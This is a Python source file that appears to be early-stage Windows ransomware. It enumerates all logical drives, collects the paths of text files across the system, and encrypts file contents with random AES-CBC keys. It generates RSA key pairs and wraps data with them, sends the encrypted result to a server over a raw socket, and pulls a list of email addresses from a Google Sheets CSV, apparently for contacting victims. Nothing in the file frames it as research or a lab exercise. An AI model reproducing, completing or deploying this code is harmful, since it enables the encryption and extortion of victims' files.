import random, os, string
import win32api
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
import socket
import requests
import csv


def generate_key(length):
    """Generate a random ASCII key of given length"""
    ascii_key = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return ascii_key

def findRootDirsWindows():
    """Find the root directories in Windows"""
    drives = win32api.GetLogicalDriveStrings()
    roots = drives.split('\000')[:-1]
    return roots

def findTxtFile():
    """Find all text files in the system and write their paths to a .txt file"""
    root_dirs = findRootDirsWindows()
    for root_dir in root_dirs:
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    # Write file_path to a .txt file
                    with open("file_paths.txt", "a") as f:
                        f.write(file_path + "\n")


def pad_data(data):
    """Pad the data to be 16-byte for encryption"""
    pad_len = 16 - len(data) % 16
    bytes_data = bytes([pad_len] * pad_len)
    my_bytes = data.encode()
    return my_bytes + bytes_data

def encrypt_data(key, data):
    """Encrypt the data using AES-CBC"""
    print(key)
    iv = os.urandom(16)
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad_data(data))
    return iv + encrypted_data

def generateRSAKeys():
    """Generate an RSA key pair"""
    # Generate an RSA key pair with a key length of 2048 bits
    key = RSA.generate(2048)
    # should we use pkcs=8 to be able to have a consistent format for the both keys? Nope, it's not necessary
    # check "https://stackoverflow.com/questions/18039401/how-can-i-transform-between-the-two-styles-of-public-key-format-one-begin-rsa"
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    print("Private key:\n", private_key.decode())
    print("\nPublic key:\n", public_key.decode())
    return  public_key, private_key

def saveKey(key, filename):
    # Define the path to the desktop folder
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop_path):
        print(f"The desktop directory {desktop_path} does not exist!")
    else:
        
        content = key
        with open(os.path.join(desktop_path, filename), "w") as file:
            file.write(content)

def testEncryption():
    file_path = r'file_test.txt'
    ascii_key = generate_key(16)
    with open(file_path, 'r') as f:
        data = f.read()
    encrypted_data = encrypt_data(ascii_key, data)
    with open('encrypted_file', 'wb') as f:
        f.write(encrypted_data)
    return ascii_key

def encryptWithRSA(data, public_key):
    """Encrypt the data using RSA"""
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_data = encryptor.encrypt(data)
    encoded_encrypted_msg = base64.b64encode(encrypted_data)
    print(encoded_encrypted_msg)
    return encoded_encrypted_msg 
def send_to_server(encoded_encrypted_msg):
    SERVER_IP = '127.0.0.1'
    SERVER_PORT = 5678

    with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        data = s.recv(1024)
        print(data)
        s.send(encoded_encrypted_msg)
    input()
def get_emails_from_csv():
    url = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
    response = requests.get(url)
    # convert the data to a csv format
    data = csv.DictReader(response.text.splitlines())
    # return only the emails
    emails = [row['Email'] for row in data]
    return emails

